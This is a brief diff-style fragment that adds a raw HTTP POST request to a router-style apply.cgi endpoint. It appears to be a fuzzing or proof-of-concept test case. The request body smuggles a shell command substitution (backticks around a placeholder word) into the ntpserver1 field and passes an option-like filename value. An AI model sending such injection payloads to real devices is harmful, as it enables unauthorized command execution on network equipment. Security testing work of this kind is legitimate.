@@ -1,0 +1,6 @@
+POST /apply.cgi?WANEthernetLinkConfig HTTP/1.1
+Host: 242
+Content-Type: application/json
+Content-Length: 80
+
+ntpserver1=;`wzq`&%20timestamp=wzqwzqwzq&submit_flag=block_sites&filename=-V
